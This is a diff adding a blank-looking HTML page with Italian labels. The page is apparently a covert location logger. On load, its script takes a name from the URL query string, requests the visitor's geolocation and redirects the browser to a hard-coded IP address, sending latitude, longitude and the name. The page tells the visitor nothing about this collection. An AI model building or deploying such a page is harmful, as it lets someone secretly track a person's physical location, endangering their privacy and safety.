@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="it-IT" prefix="og: http://ogp.me/ns#" class="no-js no-svg">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://code.jquery.com/jquery-2.2.4.js" integrity="sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=" crossorigin="anonymous"></script>
+</head>
+<body>
+
+<div id="links">
+
+</div>
+
+<script language="javascript" type="text/javascript">
+
+
+var queryString = window.location.search.replace(/^\?/, '');
+console.log('nome' + queryString);
+$('#links').attr('nome',queryString);
+getLocation();
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(show_position);
+
+    } else {
+        console.log("Geolocation is not supported by this browser.");
+    }
+}
+
+function show_position(posizione){
+		var lat = posizione.coords.latitude
+		var lng = posizione.coords.longitude
+		var nome = $('#links').attr('nome');
+		window.open("http://67.205.148.230/experiment/livemap/test.php?lat="+lat+"&lng="+lng+"&nome="+nome+"", "_self");
+}
+
+
+</script>
+</body>
+</html>
